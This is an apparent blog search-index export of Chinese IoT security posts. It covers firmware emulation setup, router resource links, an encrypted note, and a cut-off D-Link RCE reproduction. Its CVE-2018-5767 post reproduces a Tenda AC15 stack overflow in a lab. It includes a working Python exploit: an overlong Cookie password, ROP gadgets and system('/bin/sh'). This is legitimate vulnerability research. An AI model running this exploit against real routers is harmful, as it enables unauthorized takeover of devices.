<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IOT环境配置V2</title>
      <link href="archives/a9578bea.html"/>
      <url>archives/a9578bea.html</url>
      
        <content type="html"><![CDATA[<h2 id="更新环境原因"><a href="#更新环境原因" class="headerlink" title="更新环境原因"></a>更新环境原因</h2><p>概述 V1版本情况：</p><ul><li>采用一台 ubuntu 1804 配有基本 pwn 工具、qemu static v5.2 、完整版 binwalk 等。承担固件包中单个文件模拟调试任务，以及通过 qemu 模拟异架构系统实现少部分路由器系统模拟。</li><li>采用 attify v3.0 (base ubuntu 18.04) 的 <a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> 模拟路由器系统</li></ul><p>V1 版本出现几个问题：</p><ul><li><p>首先是个小问题很容易解决，就是用 qemu uesr 模式单文件模拟调试，gdb-multiarch 有时会连不上。查了下资料、问了问师傅推测可能是 gdb 版本问题。</p><p>解决方法换个 ubuntu（16、20）就行了，qemu 都是每个系统的标配。</p></li><li><p>用 ubuntu 1804 qemu system 模式异架构系统，再在 qemu 虚拟机上运行固件。导入固件文件后，启动脚本基本在 <code>/etc/rc.d/init.d</code> </p><blockquote><p><a href="https://blog.csdn.net/cradmin/article/details/2270497">linux /etc/rc.d/目录的详解-cradmin</a></p><p><a href="https://blog.csdn.net/qq_29350001/article/details/51788937">linux /etc/rc.d/目录的详解-聚优致成</a></p></blockquote><p>这种方法能成功跑起来次数不多，但 qemu 使用桥接模式，让 qemu 虚拟机可与宿主机同一网段，方便调试抓包等。</p></li><li><p>当 ubuntu 1804 qemu system 模拟固件不成功，我就会尝试用 attify FAT 模拟，成功率到时挺高的，但由于 FAT 将 firmadyne 全部操作都整合起来，导致难以个性化修改。比较突出就是：</p><ul><li><p>自动生成启动脚本 <code>run.sh</code> 所配置的网络不能与宿主机在同一个网段，而是和 attify 在同一网段，导致如果想抓包，进行整系统测试时，只能在 attify 中完成。</p><blockquote><p>自动生成脚本在 attify 中新建一个网卡 192.168.0.2 ，链接到 qemu 虚拟机中，虚拟机网卡为 192.168.0.1 。attify 访问 192.168.0.1 即访问路由器后台</p></blockquote><p>尝试修改修改 run.sh 的启动模式，将网络模式修改为桥接，手动创建网桥、tap0 网卡等。异架构 debian 可以成功分配到宿主机网段 ip 出网，对于路由器固件就不行，原因未知。</p></li><li><p>firmadyne 是将固件制作成镜像模拟，也就是说 ssh 密码、 root 密码等等都是固件原有的。当模拟起来后，连不上 shell 就别想着查询端口，通过进程查询提供服务的文件 ……</p><p>这个问题解决方法就是放弃 FAT ，自己手工完成 firmadyne 模拟准备工作。解压固件后，将 <code>/etc/shadow</code> 替换一下，然后才制作镜像。问题在于说 attify 在进行解压时连不上 PostgreSQL ，使用 FAT 脚本就能连上。</p></li></ul></li><li><p>在原有 ubuntu 1804 上搭建 firmadyne ，可能安装脚本部分东西与原有环境有冲突装不上。firmadyne 的 docker 版本没有尝试过。</p></li></ul><p>V2 版本设想的几种方案：</p><ol><li>解决 firmadyne 模拟路由器固件桥接网络不成功问题，让路由器与宿主机在同一网段。</li><li>firmadyne docker 不过这个也是要解决网段问题……</li><li>在 ubuntu 1804 上搭 firmadyne ，放弃分配宿主机网段，直接在 ubuntu 里完成工作</li></ol><p>存一下参考文章</p><ul><li><p>解决出网问题</p><p><a href="https://wzt.ac.cn/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a></p><p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/">QEMU 网络配置一把梭</a></p></li><li><p>将 firmadyne 部署在云端</p><p><a href="https://zhuanlan.zhihu.com/p/110806057">Firmadyne的固件模拟环境搭建(超详细)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firmadyne </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器资源整理</title>
      <link href="archives/e244711.html"/>
      <url>archives/e244711.html</url>
      
        <content type="html"><![CDATA[<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>  • 国内：<a href="http://support.dlink.com.cn:9000/">http://support.dlink.com.cn:9000/</a><br>  • 台湾/香港：<a href="http://www.dlinktw.com.tw/techsupport">http://www.dlinktw.com.tw/techsupport</a><br>  • 老旧设备资源（均为US版）：<a href="https://legacy.us.dlink.com/">https://legacy.us.dlink.com/</a></p><h2 id="CVE-仓库"><a href="#CVE-仓库" class="headerlink" title="CVE 仓库"></a>CVE 仓库</h2><p>  • <a href="https://github.com/PAGalaxyLab/VulInfo">https://github.com/PAGalaxyLab/VulInfo</a><br>  • <a href="https://github.com/GD008/vuln">https://github.com/GD008/vuln</a></p><h2 id="厂商安全公告"><a href="#厂商安全公告" class="headerlink" title="厂商安全公告"></a>厂商安全公告</h2><p>  • Dlink：<a href="http://forums.dlink.com/index.php?board=528.0">http://forums.dlink.com/index.php?board=528.0</a><br>      含有 patch 版本下载</p><h2 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h2><p>​    • <a href="https://www.cnvd.org.cn/flaw/list.htm">https://www.cnvd.org.cn/flaw/list.htm</a></p><h2 id="学习文档"><a href="#学习文档" class="headerlink" title="学习文档"></a>学习文档</h2><h3 id="总结性-WIKI"><a href="#总结性-WIKI" class="headerlink" title="总结性 WIKI"></a>总结性 WIKI</h3><p>  • 伏宸安全物联网安全百科：<a href="https://github.com/yaseng/iot-security-wiki">https://github.com/yaseng/iot-security-wiki</a><br>  • Tide安全Iot物联网安全wiki：<a href="https://www.yuque.com/tidesec/iot">https://www.yuque.com/tidesec/iot</a><br>  • 海特实验室IOTWIKI：<a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki</a><br>  • 绿盟智能设备安全分析手册：<a href="https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html">https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html</a></p><h2 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h2><p>  • 各种架构 gdbserver ：<a href="https://github.com/rapid7/embedded-tools">https://github.com/rapid7/embedded-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 资料 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DIR816(A2)分析笔记</title>
      <link href="archives/82d75da8.html"/>
      <url>archives/82d75da8.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="72d40e39f0bcf744a1c0211fe217d46680eb1bb879b6d8dc6e726f6411fb3823">69f66bb303f4eb154bdf9b8574fd2b5517a942a91f63560c1f86d15d14c881f9498cb5b2e996f18abcf8fbb1333486721e3cf7dca42114462dd3bde982187ba5fd4c813068be7254910cdca2671eee589ff2fe48e0f0d4f9924ad6e22d5db9316219e4b282109448dc2fb2d823fca71449893ac9648e72991ea481245d5e95535f092b2bf09c090a0e1068ca9e1c8883fa855692c2f9f46d2d66f691b56762c2d74fce53541b6f6ef3c200e37c76a5f2ac02c1eede5794b506dfb4dbe29e5617e4110967269e7cf22f46eee8595dec0a9b7777eac1d3036479df55c31490d4ab5ce67ad82cc841ff2e61beca6d09a165c1779ddd87d3ceb67177ceddb4b5548aad8cb05733e58e15b0b324aa875164d5f18a9610ab3e9320b4d0e31316b6eef14399bce802e98f1bc5434d36e2da3e9faba5c88c7be7b3b84613f19f92805fdac9533991b3186a002fc0a6c5114f52b797625ed03ca16e6eceb48e29bd21da4900c0e8b79dcbe1617dc649c2121d718f31ab90fe3ccb137e448c0c0fff2b0d4d6b200a6cc19b56ba6d1578f5d5f4658d31d8c9db61c0140c0537efd39b98e086c9e3fbc201c76a0aa02795add8d1eabb4637823adb83a88c3c17b8700205009fc8a4be29fe6c96e216b5ee064dcd0a3cf9b14efa5bbb9a9e2956c38270a06bca51f5da8a809242c6f27a36a8bd29412322bf4de95ef489ec0bbf1afcf6219d910b4c9673ea40df13e1d4e49a52e1ae61b8a9a78180f770c0050b23f0ed273dd4fe9c9e4081c66314c363249d97c078f74882a6790b7a6a83501eb0ca4f1b74e8ab85b815a181bd4250fecc2f42d07a288b4fd9dd85316587cadfc0b5a6f6fe59119817446f7253b71d15db499aad69f4a881ec7d03f448a5d8dd41611ba46ebf0cd34fe457918a738b8800cf458aa1e05997e06d67e5c403909479f795a8d46fcee1f7f294429c5a5c7402952ad354e989c2016792346568c93832442e638a647f330d2bf1a28d2b82d147ab171fc8233498697751305176d41faaba66aeae20dfbb3d9fff34c8f4a9bc35f7836103cdd74d582fb4e96dd24b7c6241e7cdb8095301f6d2be4f7e59d73c3986dad19a855fc36caa5ed8783002fc7427d9cba3c6891045480232fbeb603b1855ccdaca449af5c6f8ed82bae2670d7f793cbb1842cd8e57c856e175b2f77e10ce927e39e421f20ecee0467b4606482f26d4734294be7ea7928f855c2e6d5e9d70dc4c66356f565fb86446d605e0f1a840371a3b130b03944d9c81abc5c4518a149d92d4fb32d2d95bd6f87eae063e6399146f6662ff8fb0e8690813ba7347180c99315d2c9c8979f576110263a4ef04db2189bfc466c41770d99a1e21a3a6bf1ee1bf3551284cfa01d00eb3d130427f88c1a54c6b8a7176dc577350337eafd93eb448ce6739096cc9c4a413c6514e08b8d4bb34eeb3f7c625682ca381b928b2fe539a4a536738cb86572ed7d76777f354aaff7a4d1a6ab05db2e6d7232996a5a876be37c25c73f52ea72c2815909de702ffa35977bacf03c966bf15b134f3448cc94615de3feb00deea51928680b5c8c733fd6c45debc29add91d034a10086b58dc460ff8d12adc93d7f920814d80586cf79b4d710452316ff8121c3c8408680972dfa278ca8083f6590e1da571c1411d8a093d0bb6086e829552b52a7de098f2d55c2756b913db90b854ae2763afc87b4f679a4f5bb44080de6cc5cd37353b83e3c3e003a44846a54c18fa4b3cb35d9f4b03c18b080a754dc75f166246ce415949f8023f5583169fe69da450695c0af0f694b007545348bca67b284e26cd31618223c84074ae32bdd02b9350f20976758b0da0140256fb7877d991e52f1dc33f24a9f02f3f80360d8cd2d8abdaa18dbd54f1a8505d95687d6db7eab59de1719a10ca96b31e534827850925bc206e3e7133fbe2dbedb02536406c84576df22a1f3851f02c11e98fb2e7ead1973fc322bb853955e02e54a67cf93ce54d0e284704472e9c2227ff980a1613d1f836ecb2430c142fff62e8f4338007b3de6cfb55dd1883b46f1d5771d83a716cbc61df4e63bb6b964e6977b2287bbd2896718b7ce7f50bde53b232fd78342bbfdd8d9ad80baf30c68b3645cbd18b70b049806e301ae84e03817b2018d0e914b0cf4c69c729fabd884d76fda170cf6159898fc24c217c9327833f28b48c8eeb99a68e4afe5ec2ba66f22eae245c9f981a3489768b67bf3228691c094daef6d357df9f79e88a8fb764f2d94f459762e628638b2d78b9d899363acfc90280ba2df45141d59ecd1956d19b9ff52c20786fc6ba21ffcbf0b3c2279f0eb82e72b9c300911ff1136f2d46817af97e4554f52df250aaa243d3f39ed71f1e6c3fbcd22b2cdcf704c70a720685774bdeb63fe8a5807b7f8d1846d3ccf632d3ed044446dbffa6731b14d222fa47426f44b34eff0745a19e4bca5c5b42e791617b8e54f0236e4e502ef695cbcd1b61760f8a8854134b337e41962de2d0cdb072dc88ed710d0e5d85427ba32dffe42cb702d56d9998436c4e3bc7a1ce54d8632af2ea8a7ca1523fb940f47536a70711e7513e48590b108a1126d928cc142cb070feb2bb19fe396bb2799cd062bd07a61af22e2b8c5f22a2b7c23abde0abb88e2a28690bd38b152b8ecd7ddc029e499cca6523761601e250e64d9a3fbda53d7f6fc9368ba9bdafaf10a029b7760e51e76290457717e0abdbc3ce765d0d3af01fd08a4dbfadb79fd1238697d1074f037956f5477f6cfce5f44c34d688ed8391689cd3c56c67506f8ababbae481ceb6526dfbc262f1c2e87971cc5ad2798ed23c3d6bcf1e3948d5177c67d8193b9c7ecec201e9aaa39a54e181a06d79431a3a82417a2186e0d8cf8250bd35f24a9336b23d02138281673138ff9a52c64e6ab50b745bc9451443e9f2cbe398ce4311264dae3669519854a23b65eb019375734965df8e2a85725d77112ff7dc3d7a4bb4943dfd2fb6ff5b961a7d8c4c993648d8ab7038c91f3db073493257e551bd2f9e613</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Dlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-5767 栈溢出漏洞复现</title>
      <link href="archives/af28835.html"/>
      <url>archives/af28835.html</url>
      
        <content type="html"><![CDATA[<p>TENDA-AC15 型号路由器上的一个漏洞，产生原因是没有限制用户输入，使用 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件在官网没找着，去百度找到了，地址在<a href="http://www.kuaihou.com/soft/311837.html">这里</a></p><p>版本号：V15.03.1.16</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210113356.png" alt="image-20210210113356276"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>需要配置好 qemu 桥接网络，不能就去 patch 一下 check_network 的返回值。</p><h3 id="设置桥接网络"><a href="#设置桥接网络" class="headerlink" title="设置桥接网络"></a>设置桥接网络</h3><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>修改 <code> /etc/network/interfaces</code> 网卡配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>修改 qemu 网络脚本 <code>/etc/qemu-ifup</code> 为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><p>给脚本加上权限，重启网络服务，如果连不上网可以重启一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>运行程序还是报错，通过字符串定位到 <code>ConnectCfm</code> 函数，看不到函数体，应该是在其他文件定义的，这里也要 patch 改下跳转条件：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124651.png" alt="image-20210210124651672"></p><p>然后就能正常运行 httpd 服务（如果 check_network 检查是 patch 解决的，这里 ip 会有点诡异）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124735.png" alt="image-20210210124735721"></p><p>在 <code>R7WebsSecurityHandler</code> 开头打上断点，这个函数处理 <code>/goform/execCommand</code> 的请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210131807.png" alt="image-20210210131807628"></p><p>用 burpsuite 给 <code>/goform/execCommand</code> 发个包，加上 Cookie 的 password 属性，长度弄长点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;goform&#x2F;execCommand HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.211.7</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><p>当检索 password 属性后将值经过 sscanf 正则过滤后存放到 v34 的字符串列表局部变量：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210140729.png" alt="image-20210210140543403"></p><p>继续运行就会报段错误退出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210141320.png" alt="image-20210210141320615"></p><p>用 gdb-multiarch 跟一下，查看一下地址信息。发现是在一个 if 判断中退出报错，而不是在 R7WebsSecurityHandler 退出，这样控制程序流有点复杂：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211012033.png" alt="image-20210211012033940"></p><p>根据规则如果 URL 文件后缀不是 gif 才进入 if 函数体，那么就加一个 <code>.gif</code> 让程序流直接从 R7WebsSecurityHandler 返回，这样控制起来就简单多。</p><p>然后用 cycli 生成字符串测量长度，要注意加 1 再算 padding ，得出长度为 447 。成功控制返回地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;Cookie&#39;: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211232722.png" alt="image-20210211232722219"></p><h3 id="ROP-利用链"><a href="#ROP-利用链" class="headerlink" title="ROP 利用链"></a>ROP 利用链</h3><p>arm 返回地址是在 pc 寄存器，不是在栈上。qemu 虚拟机没有随机化地址。</p><p>构造出 <code>system(&#39;/bin/sh&#39;)</code> ，<code>/bin/sh</code> 长度超过 4 字节，由于对齐要占据 8 字节空间，<code>pop r0,pc</code> gadget 不能直接用了。</p><p>先用 <code>pop r3,pc</code> 将 system 放到 r3 ，同时压入 <code> mov r0,sp;blx r3</code> ，这时 sp 寄存器指向 /bin/sh ，将参数地址移动到 r0 ，然后跳转 r3 地址。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234133.png" alt="image-20210211234133733"></p><p>qemu 需要加上 -strace 查看调用：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234504.png" alt="image-20210211153837937"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.211.7&quot;</span></span><br><span class="line">command = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&#123;:s&#125;/goform/exeCommand&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x3fde6000</span></span><br><span class="line">pop_r3_pc = struct.pack(<span class="string">&quot;&lt; I&quot;</span>,<span class="number">0x00018298</span>+libc)<span class="comment">#pop r3 pc</span></span><br><span class="line">mov_r0_sp_blx_r3 = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x00040cb8</span> + libc)<span class="comment"># mov r0 sp; blx r3</span></span><br><span class="line">system = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x0005A270</span>+libc)</span><br><span class="line">command = command.encode()<span class="comment"># &#x27;byte&#x27;</span></span><br><span class="line">password = <span class="string">b&quot;A&quot;</span> * <span class="number">444</span>+<span class="string">b&quot;.gif&quot;</span>+pop_r3_pc+system+mov_r0_sp_blx_r3+command</span><br><span class="line">headers[<span class="string">&#x27;Cookie&#x27;</span>]=<span class="string">b&quot;password=&quot;</span>+password</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,headers=headers,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/wireless/166869.html">https://www.freebuf.com/articles/wireless/166869.html</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tenda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2018-01084 远程代码执行复现</title>
      <link href="archives/b71b6381.html"/>
      <url>archives/b71b6381.html</url>
      
        <content type="html"><![CDATA[<p>Dlink DIR 615/645/815 路由上远程代码执行漏洞。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）<br>版本号为 v1.02（v1.03完成修复）</li><li>qemu v5.2</li><li>Ubuntu 18.04</li><li>ida 7.5（能搞 mips 反编译工具都行）</li></ul><p>直接运行如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src= "/img/loading.gif" 